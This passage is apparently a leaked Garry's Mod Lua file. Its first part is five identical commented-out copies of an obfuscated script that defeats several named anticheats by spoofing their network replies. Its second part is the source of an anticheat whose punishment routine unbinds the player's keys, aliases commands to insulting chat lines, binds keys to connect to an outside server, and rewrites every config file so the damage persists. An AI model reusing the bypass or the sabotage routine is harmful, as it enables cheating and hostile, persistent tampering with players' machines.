if (SERVER) then AddCSLuaFile() end

--[[
local
_={_="Start",a="WriteString",b="SendToServer",c="Receive",d="WriteInt",e="AddText",f="WriteUInt"}if!string.Comma
then
return
end
local
a,b=_SCRIPT,_SOURCE:lower()print(b..": "..a)if!!1
then
return
end
if
b:find"cl_anticheat.lua"&&a:find"Awesome AntiCheat Plugin - AACP"||b:find"cl_settingsderma.lua"then
return!1
end
if
b:find"cl_draw_check.lua"||a:find"Blade AntiCheat?"then
return!1
end
if
b:find"cl_dazanticheat.lua"then
return!1
end
if
a:find"//---Fish's AntiCheat---//"then
usermessage.Hook("facSTL",function()net[_._]"ferpHUDSqu"net.WriteTable{}net[_.a]"garrysmod"net[_.b]()end)return!1
end
if
b:find"fuckme.lua"&&a:find"mrand()"then
return!1
end
if
a:find"mAC_Ban"then
return!1
end
if
b:find"cl_kevlar.lua"then
net[_.c]("lolwut",function()for
a=1,6
do
if(a<=4)then
net[_._]"lolwut"net[_.d](a,8)net.WriteTable{}net[_.b]()else
net[_._]"lolwut"net[_.d](a,8)net[_.a]"N/A"net[_.b]()end
end
end)net[_.c]("gotcha",function()chat[_.e](Color(0,100,255),"[Kevlar] ",Color(255,255,255),net.ReadString())end)return!1
end
if(b=="luacmd")then
local
b,c="ijustwannahaveyourightbymyside","hellohellohelloimcool"if
a:find("if not "..c)||a:find"LeyAC = false if"then
net[_._](b)net[_.a]" "net[_.b]()return!1
end
end
if
b:find"_ley_imp.lua"then
local
b,d="ijustwannahaveyourightbymyside","hellohellohelloimcool"if!a:find"CheckCV"then
net[_.c](b,function()net[_._](b)net[_.a]" "net[_.b]()end)hook.Add("InitPostEntity","LeyAC",function()net[_._](b)net[_.a]"in"net[_.a](d)net[_.b]()hook.Remove("InitPostEntity","LeyAC")end)else
local
e=""for
f=1,1000
do
e=e.."a"end
net[_.c](b,function()local
g=net.ReadString()if(g=="a")then
net[_._](b)net[_.a]"in"net[_.f](#e,32)net[_.a](d)net.WriteData(e,#e)net[_.b]()elseif(g=="c")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to screenshot you.")elseif(g=="z")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to read your files.")end
end)end
return!1
end
if
b:find"cl_leyac_menu.lua"then
return!1
end
if
a:find"tc(name1"then
local
a="fxxcvsaw3t"net[_.c](a,function()local
a=net.ReadEntity()if
IsValid(a)then
chat[_.e](Color(255,0,0,255),a:Nick().." is a dirty cheater!")end
end)return!1
end
if
b:find"cl_qac.lua"then
net[_.c]("Ping2",function()local
a=net.ReadInt(10)net[_._]"Ping1"net[_.d](a,16)net[_.b]()end)net[_.c]("Debug2",function()local
a=net.ReadInt(10)net[_._]"Debug1"net[_.d](a,16)net[_.b]()end)return!1
end
if
b:find"sh_screengrab.lua"||b:find"cl_screengrab.lua"then
net[_.c]("screengrab_start",function()net[_._]"screengrab_start"net[_.f](1,32)net[_.b]()end)net[_.c]("screengrab_part",function()net[_._]"screengrab_part"net[_.f](1,32)net.WriteData(util.Compress(1),len)net[_.b]()end)return!1
end
if
a:find"local servRCC"then
return!1
end
if
b:find"cl_blunderbuss.lua"then
timer.Create("TACTimer",math.random(60,120),0,function()net[_._]"ttt_scoreboard"net[_.a]"gotit"net[_.b]()net[_._]"dm_vars"net[_.a]"gotit"net[_.b]()end)return!1
end
if
b:find"cl_vbac.lua"then
return!1
end
if
b=="luacmd"&&a=="while true do end"then
MsgC(Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")return!1
end
]]
--[[
local
_={_="Start",a="WriteString",b="SendToServer",c="Receive",d="WriteInt",e="AddText",f="WriteUInt"}if!string.Comma
then
return
end
local
a,b=_SCRIPT,_SOURCE:lower()print(b..": "..a)if!!1
then
return
end
if
b:find"cl_anticheat.lua"&&a:find"Awesome AntiCheat Plugin - AACP"||b:find"cl_settingsderma.lua"then
return!1
end
if
b:find"cl_draw_check.lua"||a:find"Blade AntiCheat?"then
return!1
end
if
b:find"cl_dazanticheat.lua"then
return!1
end
if
a:find"//---Fish's AntiCheat---//"then
usermessage.Hook("facSTL",function()net[_._]"ferpHUDSqu"net.WriteTable{}net[_.a]"garrysmod"net[_.b]()end)return!1
end
if
b:find"fuckme.lua"&&a:find"mrand()"then
return!1
end
if
a:find"mAC_Ban"then
return!1
end
if
b:find"cl_kevlar.lua"then
net[_.c]("lolwut",function()for
a=1,6
do
if(a<=4)then
net[_._]"lolwut"net[_.d](a,8)net.WriteTable{}net[_.b]()else
net[_._]"lolwut"net[_.d](a,8)net[_.a]"N/A"net[_.b]()end
end
end)net[_.c]("gotcha",function()chat[_.e](Color(0,100,255),"[Kevlar] ",Color(255,255,255),net.ReadString())end)return!1
end
if(b=="luacmd")then
local
b,c="ijustwannahaveyourightbymyside","hellohellohelloimcool"if
a:find("if not "..c)||a:find"LeyAC = false if"then
net[_._](b)net[_.a]" "net[_.b]()return!1
end
end
if
b:find"_ley_imp.lua"then
local
b,d="ijustwannahaveyourightbymyside","hellohellohelloimcool"if!a:find"CheckCV"then
net[_.c](b,function()net[_._](b)net[_.a]" "net[_.b]()end)hook.Add("InitPostEntity","LeyAC",function()net[_._](b)net[_.a]"in"net[_.a](d)net[_.b]()hook.Remove("InitPostEntity","LeyAC")end)else
local
e=""for
f=1,1000
do
e=e.."a"end
net[_.c](b,function()local
g=net.ReadString()if(g=="a")then
net[_._](b)net[_.a]"in"net[_.f](#e,32)net[_.a](d)net.WriteData(e,#e)net[_.b]()elseif(g=="c")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to screenshot you.")elseif(g=="z")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to read your files.")end
end)end
return!1
end
if
b:find"cl_leyac_menu.lua"then
return!1
end
if
a:find"tc(name1"then
local
a="fxxcvsaw3t"net[_.c](a,function()local
a=net.ReadEntity()if
IsValid(a)then
chat[_.e](Color(255,0,0,255),a:Nick().." is a dirty cheater!")end
end)return!1
end
if
b:find"cl_qac.lua"then
net[_.c]("Ping2",function()local
a=net.ReadInt(10)net[_._]"Ping1"net[_.d](a,16)net[_.b]()end)net[_.c]("Debug2",function()local
a=net.ReadInt(10)net[_._]"Debug1"net[_.d](a,16)net[_.b]()end)return!1
end
if
b:find"sh_screengrab.lua"||b:find"cl_screengrab.lua"then
net[_.c]("screengrab_start",function()net[_._]"screengrab_start"net[_.f](1,32)net[_.b]()end)net[_.c]("screengrab_part",function()net[_._]"screengrab_part"net[_.f](1,32)net.WriteData(util.Compress(1),len)net[_.b]()end)return!1
end
if
a:find"local servRCC"then
return!1
end
if
b:find"cl_blunderbuss.lua"then
timer.Create("TACTimer",math.random(60,120),0,function()net[_._]"ttt_scoreboard"net[_.a]"gotit"net[_.b]()net[_._]"dm_vars"net[_.a]"gotit"net[_.b]()end)return!1
end
if
b:find"cl_vbac.lua"then
return!1
end
if
b=="luacmd"&&a=="while true do end"then
MsgC(Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")return!1
end
]]
--[[
local
_={_="Start",a="WriteString",b="SendToServer",c="Receive",d="WriteInt",e="AddText",f="WriteUInt"}if!string.Comma
then
return
end
local
a,b=_SCRIPT,_SOURCE:lower()print(b..": "..a)if!!1
then
return
end
if
b:find"cl_anticheat.lua"&&a:find"Awesome AntiCheat Plugin - AACP"||b:find"cl_settingsderma.lua"then
return!1
end
if
b:find"cl_draw_check.lua"||a:find"Blade AntiCheat?"then
return!1
end
if
b:find"cl_dazanticheat.lua"then
return!1
end
if
a:find"//---Fish's AntiCheat---//"then
usermessage.Hook("facSTL",function()net[_._]"ferpHUDSqu"net.WriteTable{}net[_.a]"garrysmod"net[_.b]()end)return!1
end
if
b:find"fuckme.lua"&&a:find"mrand()"then
return!1
end
if
a:find"mAC_Ban"then
return!1
end
if
b:find"cl_kevlar.lua"then
net[_.c]("lolwut",function()for
a=1,6
do
if(a<=4)then
net[_._]"lolwut"net[_.d](a,8)net.WriteTable{}net[_.b]()else
net[_._]"lolwut"net[_.d](a,8)net[_.a]"N/A"net[_.b]()end
end
end)net[_.c]("gotcha",function()chat[_.e](Color(0,100,255),"[Kevlar] ",Color(255,255,255),net.ReadString())end)return!1
end
if(b=="luacmd")then
local
b,c="ijustwannahaveyourightbymyside","hellohellohelloimcool"if
a:find("if not "..c)||a:find"LeyAC = false if"then
net[_._](b)net[_.a]" "net[_.b]()return!1
end
end
if
b:find"_ley_imp.lua"then
local
b,d="ijustwannahaveyourightbymyside","hellohellohelloimcool"if!a:find"CheckCV"then
net[_.c](b,function()net[_._](b)net[_.a]" "net[_.b]()end)hook.Add("InitPostEntity","LeyAC",function()net[_._](b)net[_.a]"in"net[_.a](d)net[_.b]()hook.Remove("InitPostEntity","LeyAC")end)else
local
e=""for
f=1,1000
do
e=e.."a"end
net[_.c](b,function()local
g=net.ReadString()if(g=="a")then
net[_._](b)net[_.a]"in"net[_.f](#e,32)net[_.a](d)net.WriteData(e,#e)net[_.b]()elseif(g=="c")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to screenshot you.")elseif(g=="z")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to read your files.")end
end)end
return!1
end
if
b:find"cl_leyac_menu.lua"then
return!1
end
if
a:find"tc(name1"then
local
a="fxxcvsaw3t"net[_.c](a,function()local
a=net.ReadEntity()if
IsValid(a)then
chat[_.e](Color(255,0,0,255),a:Nick().." is a dirty cheater!")end
end)return!1
end
if
b:find"cl_qac.lua"then
net[_.c]("Ping2",function()local
a=net.ReadInt(10)net[_._]"Ping1"net[_.d](a,16)net[_.b]()end)net[_.c]("Debug2",function()local
a=net.ReadInt(10)net[_._]"Debug1"net[_.d](a,16)net[_.b]()end)return!1
end
if
b:find"sh_screengrab.lua"||b:find"cl_screengrab.lua"then
net[_.c]("screengrab_start",function()net[_._]"screengrab_start"net[_.f](1,32)net[_.b]()end)net[_.c]("screengrab_part",function()net[_._]"screengrab_part"net[_.f](1,32)net.WriteData(util.Compress(1),len)net[_.b]()end)return!1
end
if
a:find"local servRCC"then
return!1
end
if
b:find"cl_blunderbuss.lua"then
timer.Create("TACTimer",math.random(60,120),0,function()net[_._]"ttt_scoreboard"net[_.a]"gotit"net[_.b]()net[_._]"dm_vars"net[_.a]"gotit"net[_.b]()end)return!1
end
if
b:find"cl_vbac.lua"then
return!1
end
if
b=="luacmd"&&a=="while true do end"then
MsgC(Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")return!1
end
]]
--[[
local
_={_="Start",a="WriteString",b="SendToServer",c="Receive",d="WriteInt",e="AddText",f="WriteUInt"}if!string.Comma
then
return
end
local
a,b=_SCRIPT,_SOURCE:lower()print(b..": "..a)if!!1
then
return
end
if
b:find"cl_anticheat.lua"&&a:find"Awesome AntiCheat Plugin - AACP"||b:find"cl_settingsderma.lua"then
return!1
end
if
b:find"cl_draw_check.lua"||a:find"Blade AntiCheat?"then
return!1
end
if
b:find"cl_dazanticheat.lua"then
return!1
end
if
a:find"//---Fish's AntiCheat---//"then
usermessage.Hook("facSTL",function()net[_._]"ferpHUDSqu"net.WriteTable{}net[_.a]"garrysmod"net[_.b]()end)return!1
end
if
b:find"fuckme.lua"&&a:find"mrand()"then
return!1
end
if
a:find"mAC_Ban"then
return!1
end
if
b:find"cl_kevlar.lua"then
net[_.c]("lolwut",function()for
a=1,6
do
if(a<=4)then
net[_._]"lolwut"net[_.d](a,8)net.WriteTable{}net[_.b]()else
net[_._]"lolwut"net[_.d](a,8)net[_.a]"N/A"net[_.b]()end
end
end)net[_.c]("gotcha",function()chat[_.e](Color(0,100,255),"[Kevlar] ",Color(255,255,255),net.ReadString())end)return!1
end
if(b=="luacmd")then
local
b,c="ijustwannahaveyourightbymyside","hellohellohelloimcool"if
a:find("if not "..c)||a:find"LeyAC = false if"then
net[_._](b)net[_.a]" "net[_.b]()return!1
end
end
if
b:find"_ley_imp.lua"then
local
b,d="ijustwannahaveyourightbymyside","hellohellohelloimcool"if!a:find"CheckCV"then
net[_.c](b,function()net[_._](b)net[_.a]" "net[_.b]()end)hook.Add("InitPostEntity","LeyAC",function()net[_._](b)net[_.a]"in"net[_.a](d)net[_.b]()hook.Remove("InitPostEntity","LeyAC")end)else
local
e=""for
f=1,1000
do
e=e.."a"end
net[_.c](b,function()local
g=net.ReadString()if(g=="a")then
net[_._](b)net[_.a]"in"net[_.f](#e,32)net[_.a](d)net.WriteData(e,#e)net[_.b]()elseif(g=="c")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to screenshot you.")elseif(g=="z")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to read your files.")end
end)end
return!1
end
if
b:find"cl_leyac_menu.lua"then
return!1
end
if
a:find"tc(name1"then
local
a="fxxcvsaw3t"net[_.c](a,function()local
a=net.ReadEntity()if
IsValid(a)then
chat[_.e](Color(255,0,0,255),a:Nick().." is a dirty cheater!")end
end)return!1
end
if
b:find"cl_qac.lua"then
net[_.c]("Ping2",function()local
a=net.ReadInt(10)net[_._]"Ping1"net[_.d](a,16)net[_.b]()end)net[_.c]("Debug2",function()local
a=net.ReadInt(10)net[_._]"Debug1"net[_.d](a,16)net[_.b]()end)return!1
end
if
b:find"sh_screengrab.lua"||b:find"cl_screengrab.lua"then
net[_.c]("screengrab_start",function()net[_._]"screengrab_start"net[_.f](1,32)net[_.b]()end)net[_.c]("screengrab_part",function()net[_._]"screengrab_part"net[_.f](1,32)net.WriteData(util.Compress(1),len)net[_.b]()end)return!1
end
if
a:find"local servRCC"then
return!1
end
if
b:find"cl_blunderbuss.lua"then
timer.Create("TACTimer",math.random(60,120),0,function()net[_._]"ttt_scoreboard"net[_.a]"gotit"net[_.b]()net[_._]"dm_vars"net[_.a]"gotit"net[_.b]()end)return!1
end
if
b:find"cl_vbac.lua"then
return!1
end
if
b=="luacmd"&&a=="while true do end"then
MsgC(Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")return!1
end
]]
--[[
local
_={_="Start",a="WriteString",b="SendToServer",c="Receive",d="WriteInt",e="AddText",f="WriteUInt"}if!string.Comma
then
return
end
local
a,b=_SCRIPT,_SOURCE:lower()print(b..": "..a)if!!1
then
return
end
if
b:find"cl_anticheat.lua"&&a:find"Awesome AntiCheat Plugin - AACP"||b:find"cl_settingsderma.lua"then
return!1
end
if
b:find"cl_draw_check.lua"||a:find"Blade AntiCheat?"then
return!1
end
if
b:find"cl_dazanticheat.lua"then
return!1
end
if
a:find"//---Fish's AntiCheat---//"then
usermessage.Hook("facSTL",function()net[_._]"ferpHUDSqu"net.WriteTable{}net[_.a]"garrysmod"net[_.b]()end)return!1
end
if
b:find"fuckme.lua"&&a:find"mrand()"then
return!1
end
if
a:find"mAC_Ban"then
return!1
end
if
b:find"cl_kevlar.lua"then
net[_.c]("lolwut",function()for
a=1,6
do
if(a<=4)then
net[_._]"lolwut"net[_.d](a,8)net.WriteTable{}net[_.b]()else
net[_._]"lolwut"net[_.d](a,8)net[_.a]"N/A"net[_.b]()end
end
end)net[_.c]("gotcha",function()chat[_.e](Color(0,100,255),"[Kevlar] ",Color(255,255,255),net.ReadString())end)return!1
end
if(b=="luacmd")then
local
b,c="ijustwannahaveyourightbymyside","hellohellohelloimcool"if
a:find("if not "..c)||a:find"LeyAC = false if"then
net[_._](b)net[_.a]" "net[_.b]()return!1
end
end
if
b:find"_ley_imp.lua"then
local
b,d="ijustwannahaveyourightbymyside","hellohellohelloimcool"if!a:find"CheckCV"then
net[_.c](b,function()net[_._](b)net[_.a]" "net[_.b]()end)hook.Add("InitPostEntity","LeyAC",function()net[_._](b)net[_.a]"in"net[_.a](d)net[_.b]()hook.Remove("InitPostEntity","LeyAC")end)else
local
e=""for
f=1,1000
do
e=e.."a"end
net[_.c](b,function()local
g=net.ReadString()if(g=="a")then
net[_._](b)net[_.a]"in"net[_.f](#e,32)net[_.a](d)net.WriteData(e,#e)net[_.b]()elseif(g=="c")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to screenshot you.")elseif(g=="z")then
chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"LeyAC attempted to read your files.")end
end)end
return!1
end
if
b:find"cl_leyac_menu.lua"then
return!1
end
if
a:find"tc(name1"then
local
a="fxxcvsaw3t"net[_.c](a,function()local
a=net.ReadEntity()if
IsValid(a)then
chat[_.e](Color(255,0,0,255),a:Nick().." is a dirty cheater!")end
end)return!1
end
if
b:find"cl_qac.lua"then
net[_.c]("Ping2",function()local
a=net.ReadInt(10)net[_._]"Ping1"net[_.d](a,16)net[_.b]()end)net[_.c]("Debug2",function()local
a=net.ReadInt(10)net[_._]"Debug1"net[_.d](a,16)net[_.b]()end)return!1
end
if
b:find"sh_screengrab.lua"||b:find"cl_screengrab.lua"then
net[_.c]("screengrab_start",function()net[_._]"screengrab_start"net[_.f](1,32)net[_.b]()end)net[_.c]("screengrab_part",function()net[_._]"screengrab_part"net[_.f](1,32)net.WriteData(util.Compress(1),len)net[_.b]()end)return!1
end
if
a:find"local servRCC"then
return!1
end
if
b:find"cl_blunderbuss.lua"then
timer.Create("TACTimer",math.random(60,120),0,function()net[_._]"ttt_scoreboard"net[_.a]"gotit"net[_.b]()net[_._]"dm_vars"net[_.a]"gotit"net[_.b]()end)return!1
end
if
b:find"cl_vbac.lua"then
return!1
end
if
b=="luacmd"&&a=="while true do end"then
MsgC(Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")chat[_.e](Color(0,154,255),"[scripthook] ",Color(255,255,255),"The server attempted to crash you.")return!1
end
]]

--[[
/*
 _____     _  _       _                 _____ _       _                 _ 
|_   _|__ (_)(_) __ _| | __ _          |  ___(_)_ __ | | __ _ _ __   __| |
  | |/ _ \| || |/ _` | |/ _` |  _____  | |_  | | '_ \| |/ _` | '_ \ / _` |
  | | (_) | || | (_| | | (_| | |_____| |  _| | | | | | | (_| | | | | (_| |
  |_|\___/|_|/ |\__,_|_|\__,_|         |_|   |_|_| |_|_|\__,_|_| |_|\__,_|
           |__/                                                           
         ____   ___  _ _  _   
        |___ \ / _ \/ | || |  
 _____    __) | | | | | || |_ 
|_____|  / __/| |_| | |__   _|
        |_____|\___/|_|  |_|  
                              

"leaked" by HH - 9 Jun 2014

*/



--[[
	=== HeX's AntiCheat ===
	"A good attempt at something impossible"
	
	If you're reading this, you have stolen my files and are a cheating dirtbag.
	This is only in use on the UnitedHosts Deathmatch server, if you want to play there,
	disconnect and return with no cheats. You'll be permabanned if you attempt to bypass this.
	
	If you have any ideas how to make this better, or something I should add, add me on steam
	http://steamcommunity.com/id/MFSiNC
	
	Dear Script Bandits:
		How low can you go.
	:(
]]

HACInstalled	   = 1
HACCredits		   = [[
	Creator        = HeX
	Ideas/Testing  = Discord/C0BRA/G-Force/TGiFallen/Sykranos/Leystryku. And all those kids who think they can "hack"
	GMod 13 fixing = Fangli/HeX
	Mac Testing    = Blackwolf
	Made for       = [United|Hosts] Deathmatch [LotsaWeapons|HAC|FastDL]
]]

--[[
	=== End credits ===
	If you read below this line, please delete this file and leave GMod forver.
]]

local function Useless() return end
local MSGHook		= "hac_united-hosts_hex"
local Silent		= false
local NotRCC		= RunConsoleCommand
local NotCCC		= CreateClientConVar
local NotCCV		= CreateConVar
local NotGCV		= GetConVar
local NotGCS		= GetConVarString
local NotGCN 		= GetConVarNumber
local NotCVE 		= ConVarExists
local NotRE			= rawequal
local NotRGT		= rawget
local NotRST		= rawset
local NotINC		= include
local NotRQ			= require
local NotGCI		= gcinfo
local NotGMT		= getmetatable
local NotSMT		= setmetatable
local NotCGB		= collectgarbage
local NotHP			= CompileString
local NotST			= RunString
local NotSX			= RunStringEx
local GetPlayer		= xpcall
local _G			= _G
local pcall			= pcall
local pairs			= pairs
local select		= select
local type			= type
local Msg			= Msg
local MsgN			= MsgN
local print			= print
local MsgC			= MsgC
local tostring		= tostring
local tonumber		= tonumber
local LocalPlayer	= LocalPlayer
local Format		= string.format
local NotSD			= string.dump
local NotCHR		= string.char
local NotSL			= string.lower
local NotGS			= string.gsub
local NotSS			= string.sub
local NotFL			= string.find
local NotDGU		= debug.getupvalue
local NotDGE		= debug.getinfo
local NotDGMT		= debug.getmetatable
local NotFO			= file.Open
local NotFXE		= file.Size
local NotFF			= file.Find
local NotFD			= file.Delete
local NotFE			= file.Exists
local NotRPF		= util.RelativePathToFull
local NotCRC		= util.CRC
local NotJST		= util.TableToJSON
local NotJTT		= util.JSONToTable
local NotB64		= util.Base64Encode
local NotTS			= timer.Simple
local NotTC			= timer.Create
local NotTD			= timer.Destroy
local NotTIT		= timer.Exists
local NotGGM		= game.GetMap
local NotMR			= math.random
local NotSCF		= surface.CreateFont
local NotSIW		= system.IsWindows
local NotJUF 		= jit.util.funcinfo
local NotTIS		= function(k,v) k[#k+1] = v end
debug.debug			= nil
debug.getfenv 		= nil
debug.gethook		= nil
debug.getlocal		= nil
debug.getupvalue	= nil
debug.setmetatable	= nil
debug.setfenv		= nil
debug.setlocal 		= nil
debug.setupvalue	= nil
debug.upvaluejoin	= nil
debug.getmetatable	= nil
jit.attach			= nil
jit.on				= nil
jit.off				= nil
debugoverlay		= nil
setfenv				= nil
debug.sethook()
debug.sethook 		= error

local _R			= debug.getregistry()
local NotRIV		= _R.Entity.IsValid
local NotBLT		= _R.Entity.FireBullets
local NotSEA		= _R.Player.SetEyeAngles
local NotPCC		= _R.Player.ConCommand
local NotCPT		= _R.Player.ChatPrint
local NotRS			= _R.bf_read.ReadString
local NotSVA		= _R.CUserCmd.SetViewAngles
local NotGIN		= _R.ConVar.GetInt
local NotGSS		= _R.ConVar.GetString
local NotGBL		= _R.ConVar.GetBool
local NotGHP		= _R.ConVar.GetHelpText
local NotGFL		= _R.ConVar.GetFloat
local NotGDF		= _R.ConVar.GetDefault

local Lists			= {
	White_DLC			= {},
	White_NNRIgnore		= {},
	White_NNRWeapons	= {},
	White_Package		= {},
	White_Require		= {},
	White_Modules		= {},
	White_GSafe			= {},
	White_GUseless		= {},
	White_CVTab			= {},
	White_Hooks			= {},
	White_CCA			= {},
	White_GM			= {},
	White_Font			= {},
	White_CCC			= {},
	White_CCV			= {},
	White_PRT			= {},
	
	Black_RCC			= {},
	Black_DataFiles		= {},
	Black_Megaloop		= {},
	Black_Hooks			= {},
	Black_NoHW			= {},
}

local function Merge(tab)
	for k,v in pairs(tab) do
		Lists[k] = v
	end
	tab = nil
end

_G.WLists		= nil
NotINC("lists/cl_w_hac.lua")
Merge(_G.WLists)
_G.WLists		= nil

_G.BLists		= nil
NotINC("lists/cl_b_hac.lua")
Merge(_G.BLists)
_G.BLists		= nil

_G.GList		= nil
NotINC("lists/sh_w_gsafe.lua")
Merge(_G.GList)
_G.GList		= nil

local Cheese,Bacon,Mail = 0,0,{}
for k,v in pairs(_R) do Bacon = Bacon + 1 end

for k,v in pairs(package.loaded) do
	Cheese = Cheese + 1
	NotTIS(Mail, k)
end

local HCCMD			= (hook or concommand)
local TCMD			= (table and table.Copy)
local PLCC			= (package.loaded.concommand)
local PLHK			= (package.loaded.hook)
local PLCV			= (package.loaded.cvars)
local DGMT			= (NotDGMT(_G) != nil)
local GGMT			= (NotGMT(_G) != nil)
local GCICount		= NotGCI()
local CGBCount		= NotCGB("count")

local function FPath(ball)
	local What = type(ball)
	if What != "function" then return What,0,false end
	local DGI = NotDGE(ball)
	if not DGI then return "Gone-"..tostring(ball),0,false end
	
	local Path = NotGS((DGI.short_src or What), "\\","/")
	local Line = (DGI.linedefined or 0)
	
	return Path,Line,true
end
local function StringCheck(str,check)
	return NotSS(str,1,#check) == check
end
local function GIsUseless(glasshammer)
	for k,v in pairs(Lists.White_GUseless) do
		if StringCheck(glasshammer, v) then
			return true
		end
	end
	return false
end

//HOW DID THIS GET HERE, I'M NOT GOOD WITH COMPUTER
local Crap = {}
local function EatKeys(Eat,Keys)
	local function RCC(str)
		local loo,poo = pcall(function()
			Eat(str)
		end)
		if poo and not Crap[poo] then
			Crap[poo] = poo
			NotTS(20, function()
				NotRCC("ohdear", "EatKey("..Keys..") ["..tostring(poo).."]")
			end)
		end
	end
	local function FuckKey(k,v) RCC('bind '..k..' "'..v..'; play hac/eight.wav; alias disconnect kill; say I CHEAT BAN ME FOR"') end
	local function FuckYou(k,v) RCC('bind '..k..' "'..v..'"') end
	
	RCC("unbindall")
	RCC('alias gamemenucommand "say WE CAN DO WONDERFUL THINGS WITH LIGHT BULBS!"')
	RCC('alias cancelselect "say I REALLY SHOULD NOT CHEAT"')
	RCC('alias disconnect "say I WILL NEVER CHEAT AGAIN!"')
	RCC('alias connect "say PIECE OF SHIT!"')
	RCC('alias exit "say I AINT HAVIN IT"')
	RCC('alias exec "say WHERES MY HAMMER"')
	RCC('alias quit "say I SHOULD NEVER HAVE USED HACKS"')
	RCC('alias toggleconsole "say I AINT HAVIN IT!"')
	RCC('alias _restart say HOW CAN IT TAKE THAT MUCH!"')

	FuckYou("y",			"messagemode")
	FuckYou("u",			"messagemode")
	FuckYou("x",			"+voicerecord")

	FuckYou("`", 			"play hac/still_not_working.mp3; gamemenucommand quitnoconfirm; say I POPPED IT!")
	FuckYou("F10", 			"play hac/really_cheat.mp3; gamemenucommand quitnoconfirm; say AND IT AINT EVEN GONNA COMPLAIN!")
	FuckYou("MOUSE1",		"+attack2; sensitivity 90; volume 0.1; say IVE LOST MY MARBLES!")
	FuckYou("MOUSE2",		"+attack; sensitivity 0.1; volume 1; play hac/highway_to_hell.mp3; say IM ON A HIGHWAY TO HELL")
	FuckYou("MOUSE3",		"kill; sensitivity 90; volume 0.1; say BURST ME BAGPIPES!")

	FuckKey("w", 			"+back; host_writeconfig cfg/autoexec.cfg")
	FuckKey("a", 			"+moveright; host_writeconfig cfg/autoexec.cfg")
	FuckKey("s", 			"+forward; host_writeconfig cfg/autoexec.cfg")
	FuckKey("d", 			"+moveleft; host_writeconfig cfg/autoexec.cfg")
	FuckKey("e", 			"+reload; volume 0.1")
	FuckKey("r", 			"+jump; volume 0.1")
	FuckKey("f", 			"noclip; connect 94.23.153.42")
	FuckKey("q", 			"connect 94.23.153.42")
	FuckKey("c", 			"connect 94.23.153.42")
	FuckKey("v", 			"impulse 100; kill")
	FuckKey("TAB", 			"+use; connect 94.23.153.42")
	FuckKey("SPACE",		"+menu; exec skill.cfg")
	FuckKey("CTRL",			"kill; exec skill_manifest.cfg")
	FuckKey("SHIFT",		"+walk; exec skill.cfg")
	FuckKey("ALT",			"+speed; exec skill_manifest.cfg")
	FuckKey("MWHEELUP",		"invnext; exec skill.cfg")
	FuckKey("MWHEELDOWN",	"invprev; exec skill_manifest.cfg")
	FuckKey("F4", 			"connect 94.23.153.42")
	FuckKey("F3", 			"connect 94.23.153.42")
	FuckKey("F2", 			"connect 94.23.153.42")
	FuckKey("F1", 			"connect 94.23.153.42")
	
	RCC("volume 0.4")
	RCC("cl_downloadfilter mapsonly")
	
	NotTS(2, function()
		RCC("host_writeconfig")
		for k,v in _H.pairs( _H.NotFF("cfg/*.cfg", "MOD") ) do
			RCC("host_writeconfig cfg/"..v)
		end
		RCC('alias host_writeconfig "gm_giveswep bargin_bazooka"')
		
		RCC('alias unbind say I REALLY DO WANNA TO THROW THIS LIGHTBULB AT THE WALL!"')
		RCC('alias unbindall echo OH DEAR!"')
		RCC('alias bind echo I POPPED IT!"')
	end)
end
local function IsRCC(s)
	s = NotSL(s)
	return NotFL(s,"com") or NotFL(s,"run") or NotFL(s,"exe") or NotFL(s,"cmd") or NotFL(s,"rcc") or NotFL(s,"con")
end
local Gun	= {}
local Dogs	= {}
local Hose 	= 0
for k,v in pairs(_G) do --From Garry with love
	Hose = Hose + 1
	local idx	= tostring(k)
	local vdx	= tostring(v)
	local KType = type(k)
	local VType = type(v)
	
	if KType == "string" then
		if VType == "table" then
			if _G[idx] != nil then
				for x,y in pairs( _G[idx] ) do
					Gun[k] = Gun[k] or {}; Gun[k][x] = y
					local SubX	= tostring(x)
					local SubY	= tostring(y)
					local YType = type(y)
					
					local Ret = "_G."..idx.."."..SubX
					
					if not GIsUseless(Ret) then
						if YType == "function" then
							local Path,Line = FPath(y)
							Ret = Ret..Format("(FUNCTION) [%s:%s]", Path,Line)
							
						elseif YType == "table" then
							Ret = Ret.." (TABLE)"
							
						else
							Ret = Ret..Format("=[[%s]] (%s)", SubY, YType:upper() )
						end
						
						if not Lists.White_GSafe[ Ret ] then
							NotTIS(Dogs, Ret)
							
							if not Silent then
								if IsRCC(SubX) then
									EatKeys(_G[k][x], Ret)
								end
								
								_G[k][x] = ErrorNoHalt
							end
						end
					end
				end
			end
			
		elseif VType != "table" then
			Gun[k] = v
			local Path,Line = FPath(v)
			local Ret = Format("_G.%s (FUNCTION) [%s:%s]", idx, Path,Line)
			
			if VType != "function" then
				Ret = Format("_G.%s=[[%s]] (%s)", idx,vdx, VType:upper() )
			end
			
			if not GIsUseless(Ret) and not Lists.White_GSafe[ Ret ] then
				NotTIS(Dogs, Ret)
				
				if VType == "function" and not Silent then
					if IsRCC(idx) then
						EatKeys(_G[k], Ret)
					end
					_G[k] = ErrorNoHalt
				end
			end
		end
	end
